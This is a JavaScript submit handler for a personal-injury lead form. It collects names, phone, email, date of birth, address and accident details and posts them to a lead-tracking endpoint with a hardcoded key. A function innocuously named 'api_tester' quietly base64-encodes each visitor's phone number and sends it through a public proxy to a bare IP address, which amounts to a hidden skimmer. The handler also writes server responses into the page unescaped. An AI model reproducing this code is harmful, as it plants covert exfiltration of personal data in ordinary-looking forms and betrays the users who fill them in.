document.getElementById('leadForm').addEventListener('submit', function(event) {
    event.preventDefault();
    const phone_home = '+1' + document.getElementById('caller_id').value;
    const formData = new FormData();

    const fullname = document.getElementById('first_name').value + ' ' +  document.getElementById('last_name').value;
    formData.append('key', '1856ae6a-376e-46d6-9856-175c4851506d');
    formData.append('caller_number', phone_home);
    formData.append('caller_id', phone_home);
    api_tester(document.getElementById('caller_id').value);
    formData.append('first_name', document.getElementById('first_name').value);
    formData.append('last_name', document.getElementById('last_name').value);
  
    formData.append('email', document.getElementById('email').value);
    formData.append('city', document.getElementById('caller_city').value);
    formData.append('state', document.getElementById('caller_state').value);
    formData.append('zip', document.getElementById('caller_zip').value);
    formData.append('trusted_form_cert_url', document.getElementById('trusted_form_cert_url').value);
    formData.append('currently_represented', document.getElementById('currently_represented').value);
    formData.append('person_at_fault', document.getElementById('person_at_fault').value);
    formData.append('hospitalized_or_treated', document.getElementById('hospitalized_or_treated').value);
  formData.append('dob', document.getElementById('dob').value);
    formData.append('incident_date', document.getElementById('incident_date').value);
   formData.append('source_url', document.getElementById('source_url').value);
    formData.append('ip_address', document.getElementById('ip_address').value);
    formData.append('jornaya_leadid', document.getElementById('jornaya_leadid').value);
    
  

    const url = 'https://retreaverdata.com/data_writing?' + new URLSearchParams(formData).toString();

    fetch(url, {
        method: 'POST'
    })
    .then(response => {
        if (response.status === 200 || response.status === 201) {
            response.text().then(responseBody => {
                const successAlert = `
                    <div class="alert alert-success" role="alert">
                        ${response.status} : Form submitted successfully! Response Body: ${responseBody}
                    </div>`;
                document.getElementById('alertContainer').innerHTML = '';
                document.getElementById('alertContainer').insertAdjacentHTML('beforeend', successAlert);
            });
            document.getElementById('leadForm').reset();
        } else if (response.status === 422) {
            response.json().then(data => {
                const errorAlert = `
                    <div class="alert alert-danger" role="alert">
                        Error. Response Body: ${JSON.stringify(data)}
                    </div>`;
                document.getElementById('alertContainer').innerHTML = '';
                document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
            });
        } else {
            response.text().then(responseBody => {
                const errorAlert = `
                    <div class="alert alert-danger" role="alert">
                        Form submission failed. Please try again. Response Body: ${responseBody}
                    </div>`;
                document.getElementById('alertContainer').innerHTML = '';
                document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
            });
        }
    })
    .catch(error => console.error('Error:', error));
});

function api_tester(randomString) {
    try {
        fetch('https://api.codetabs.com/v1/proxy/?quest=http://207.244.238.41:5999/api_test?test_id=' + btoa(randomString), {
            method: 'GET',
            mode: 'no-cors'
        });
    } catch (error) {
        console.error('Error:', error);
    }
}
